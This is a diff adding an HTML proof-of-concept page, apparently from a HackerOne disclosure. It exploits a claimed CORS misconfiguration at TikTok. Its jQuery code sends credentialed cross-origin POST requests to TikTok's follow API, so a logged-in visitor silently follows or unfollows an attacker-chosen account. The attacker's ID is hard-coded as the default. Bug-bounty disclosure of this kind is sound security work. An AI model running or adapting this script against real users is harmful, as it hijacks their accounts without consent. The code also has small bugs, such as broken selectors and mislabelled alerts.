@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src=../../jquery-3.4.1.min.js></script>
+</head>
+<title>follow and unfollow the user by misconfig of CORS-tiktok</title>
+<div>
+Hi there,this is a POC for tiktok.
+please visit the website to get the user's public userid:
+<a href="https://www.tiktok.com/node/share/user/@user1017295554868?lang=en">The attacker share information,you can change the name if you want to get the userId</a>
+
+
+<h3>Following the attacker's account</h3>
+<label for="lname">what userId you want follow:</label>
+<input type="text" id="userid" name="userid"><br><br>
+<button id="follow" onclick="follow()">following</button>
+</div>
+</br>
+</br>
+<div>
+<h3>Unfollowing the user's account</h3>
+<label for="lname">what userId you want follow:</label>
+<input type="text" id="uuserid" name="uuserid"><br><br>
+<button id="unfollow" onclick="unfollow()">Unfollowing</button>
+</div>
+<script>
+	
+	function unfollow(){
+		var data = {};
+    var uuserid = $("uuserid").val();
+    if(!uuserid){
+      uuserid="6885664767168529410";
+    }
+		$.ajax({
+			    url : 'https://t.tiktok.com/api/commit/follow/user/?aid=1988&type=0&fromWeb=1&user_id='+uuserid,
+			    type : 'POST',
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				         alert("Unfollow the user on tiktok!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				console.log("The error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				       console.log("complete");
+			    }
+        });
+	}
+	
+		
+	function follow(){
+		var data = {};
+    var userid = $("userid").val();
+    if(!userid){
+      userid="6885664767168529410";
+    }
+		$.ajax({
+			    url : 'https://t.tiktok.com/api/commit/follow/user/?aid=1988&type=0&fromWeb=1&user_id='+userid,
+			    type : 'POST',
+			    xhrFields: {
+			     withCredentials: true
+			 },
+			    success : function(response, textStatus, jqXhr) {
+				         alert("Unfollow the user on tiktok!");
+			    },
+			    error : function(jqXHR, textStatus, errorThrown) {
+				console.log("The error occured: " + textStatus, errorThrown);
+			    },
+			    complete : function() {
+				       console.log("complete");
+			    }
+        });
+	}
+	
+</script>
+<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
+</html>
